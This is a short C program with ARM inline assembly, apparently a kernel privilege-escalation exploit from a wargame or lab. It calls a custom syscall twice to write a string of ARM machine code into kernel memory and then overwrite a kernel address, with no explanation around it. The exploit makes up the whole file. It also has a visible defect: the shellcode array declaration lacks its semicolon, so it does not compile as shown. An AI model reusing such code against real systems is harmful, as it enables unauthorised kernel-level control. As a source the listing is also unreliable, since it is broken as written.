#include<stdio.h>
char cp[20] = "\xe4\xd0\x30\x01\xe4\xc1\x30\x01\xe2\x52\x20\x01\xaa\xff\xff\xfb\xe1\x2f\xff\x1e"
char addr1[] = "\xec\xbe\xff\x83";
int ret;
int main()
{
	__asm__(
        "mov r0, %1\n"
        "mov r1, %2\n"
        "mov r7, #223\n"
        "svc #0\n"
        "mov r0, %3\n"
        "mov r1, %4\n"
        "mov r7, #223\n"
        "svc #0\n"
        "mov %0, r0"
        : "=r" (ret)
        : "r"(cp), "r"(0x83ffbeec),
	  "r"(addr1), "r"(0x8000e6c4)
        : "r0", "r1", "r2", "r3", "lr"
	);
	printf("return value: %x\n", ret);
        return 0;
}
